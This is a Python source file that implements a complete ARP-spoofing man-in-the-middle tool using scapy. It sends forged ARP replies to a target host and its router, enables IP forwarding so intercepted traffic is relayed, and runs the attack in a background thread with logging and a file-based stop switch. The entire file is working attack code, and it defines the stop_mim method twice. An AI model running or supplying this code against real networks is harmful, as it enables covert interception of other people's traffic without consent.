import os
import scapy.all as scapy
import threading
import logging
import time

class ArpSpoof:
    @staticmethod
    def get_mac(ip, interface):
        try:
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=5, iface=interface, verbose=False)[0]
            if answered_list:
                return answered_list[0][1].hwsrc
        except Exception:
            pass
        return None

    @staticmethod
    def spoof(ip_who_am, mac_address_who_i_am, who_i_tell, interface):
        packet = scapy.ARP(op=2, pdst=ip_who_am, hwdst=mac_address_who_i_am, psrc=who_i_tell)
        scapy.send(packet, iface=interface, verbose=False)

    @staticmethod
    def man_in_the_middle(target_ip, router_ip, interface, control_filepath, log_filepath, force_get_mac_address=False):
        ArpSpoof.create_control_file(control_filepath)
        
        # Initial log entry
        try:
            with open(log_filepath, "a", encoding='utf-8') as f:
                f.write(f"\n--- ARP Spoof Session Started: {router_ip} <-> {target_ip} on {interface} at {time.ctime()} ---\n")
        except: pass

        target_mac = None
        router_mac = None
        packets_sent = 0
        
        while os.path.exists(control_filepath):
            try:
                if force_get_mac_address or not target_mac or not router_mac:
                    target_mac = ArpSpoof.get_mac(target_ip, interface)
                    router_mac = ArpSpoof.get_mac(router_ip, interface)
                    
                    if not target_mac or not router_mac:
                        error_msg = f"[{time.strftime('%H:%M:%S')}] ERROR: Could not find MAC for {'Target' if not target_mac else 'Router'}. Retrying...\n"
                        with open(log_filepath, "a", encoding='utf-8') as f:
                            f.write(error_msg)
                        time.sleep(5)
                        continue

                ArpSpoof.spoof(target_ip, target_mac, router_ip, interface)  # tell the target I am the router
                ArpSpoof.spoof(router_ip, router_mac, target_ip, interface)  # tell the router I am the target
                packets_sent += 2
                
                # Log periodically (every 10 packets)
                if packets_sent % 10 == 0:
                    log_msg = f"[{time.strftime('%H:%M:%S')}] Packets sent: {packets_sent}\n"
                    with open(log_filepath, "a", encoding='utf-8') as f:
                        f.write(log_msg)
                
                time.sleep(1)
            except Exception as e:
                error_msg = f"[{time.strftime('%H:%M:%S')}] ERROR with {target_ip}: {str(e)}\n"
                try:
                    with open(log_filepath, "a", encoding='utf-8') as f:
                        f.write(error_msg)
                except: pass
                time.sleep(2)
                continue

        # Final log entry
        try:
            with open(log_filepath, "a", encoding='utf-8') as f:
                f.write(f"--- ARP Spoof Session Stopped at {time.ctime()} ---\n")
        except: pass

    @staticmethod
    def create_control_file(filepath):
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        if not os.path.exists(filepath):
            with open(filepath, 'w') as f:
                f.write("running")

    @staticmethod
    def delete_control_file(filepath):
        if os.path.exists(filepath):
            os.remove(filepath)

    @staticmethod
    def get_ip_forwarding_status():
        import sys
        if not sys.platform.startswith('linux'):
            return "Unavailable (Non-Linux)"
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
                return "ENABLED" if f.read().strip() == '1' else "DISABLED"
        except Exception as e:
            return f"Error: {e}"

    @staticmethod
    def set_ip_forwarding_status(enable=True):
        import sys
        if not sys.platform.startswith('linux'):
            return False, "Non-Linux platform"
        value = '1' if enable else '0'
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write(value)
            return True, f"IP Forwarding set to {value}"
        except PermissionError:
            return False, "Permission denied (Root required)"
        except Exception as e:
            return False, f"Error: {e}"

    @staticmethod
    def ensure_ip_forwarding():
        status = ArpSpoof.get_ip_forwarding_status()
        if status == "DISABLED":
            print("[!] IP Forwarding is OFF. Victims will lose internet access.")
            print("[*] Attempting to enable IP Forwarding...")
            success, msg = ArpSpoof.set_ip_forwarding_status(True)
            if success:
                print("[+] IP Forwarding ENABLED successfully.")
            else:
                print(f"[-] {msg}. Please run as root or run:")
                print("    echo 1 > /proc/sys/net/ipv4/ip_forward")
        elif status == "ENABLED":
            print("[+] IP Forwarding is already ENABLED.")
        else:
            print(f"[!] IP Forwarding check: {status}")

    @staticmethod
    def main_mim(router_ip, target_ip, interface):
        os.makedirs('threads', exist_ok=True)
        
        # Ensure IP Forwarding is ON for routing to work
        ArpSpoof.ensure_ip_forwarding()

        name_watcher = f"{target_ip}_arp_spoof"
        control_file_path = f"threads/{name_watcher}_control"
        log_file_path = f"threads/{target_ip}_arp_spoof_log.txt"

        thread = threading.Thread(
            target=ArpSpoof.man_in_the_middle, 
            args=(target_ip, router_ip, interface, control_file_path, log_file_path, False), 
            name=f"MIM_{target_ip}",
            daemon=True
        )
        thread.start()

    @staticmethod
    def stop_mim(target_ip):
        name_watcher = f"{target_ip}_arp_spoof"
        control_file_path = f"threads/{name_watcher}_control"
        ArpSpoof.delete_control_file(control_file_path)

    @staticmethod
    def stop_mim(target_ip):
        name_watcher = f"{target_ip}_arp_spoof"
        control_file_path = f"threads/{name_watcher}_control"
        ArpSpoof.delete_control_file(control_file_path)
